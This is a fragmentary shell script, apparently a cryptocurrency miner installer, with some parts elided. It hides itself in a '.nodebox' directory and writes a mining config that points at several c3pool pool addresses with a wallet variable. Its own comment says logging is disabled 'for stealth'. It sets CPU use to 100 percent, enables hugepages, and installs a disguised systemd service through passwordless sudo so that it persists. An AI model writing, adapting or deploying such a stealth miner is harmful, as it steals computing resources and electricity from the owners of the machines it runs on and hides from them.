...
# Tự động quyết định thư mục cài đặt dựa trên quyền hạn
if [ "$(id -u)" == "0" ]; then
  INSTALL_DIR="/root/.nodebox"
else
  INSTALL_DIR="${HOME:-/var/tmp}/.nodebox"
fi
...
# Build config with logging completely disabled for stealth
cat > "$INSTALL_DIR/config.json" <<EOF_CONFIG
{
    ...
    "cuda": false,
    "pools": [
        { "url": "auto.c3pool.org:$PORT", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "auto.c3pool.org:19999", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "auto.c3pool.org:443", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "auto.c3pool.org:80", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "auto.c3pool.org:33333", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true },
        { "url": "auto.c3pool.org:23333", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false }
    ],
    "log-file": null,
    "donate-level": 0,
    "max-cpu-usage": 100,
...
if command -v systemctl >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
  ...
  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    ...
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc))) >/dev/null 2>&1
  fi

  cat > /var/tmp/nodebox.service <<EOF_SERVICE
[Unit]
...
EOF_SERVICE
  ...
  sudo mv /var/tmp/nodebox.service "/etc/systemd/system/$SERVICE_NAME"
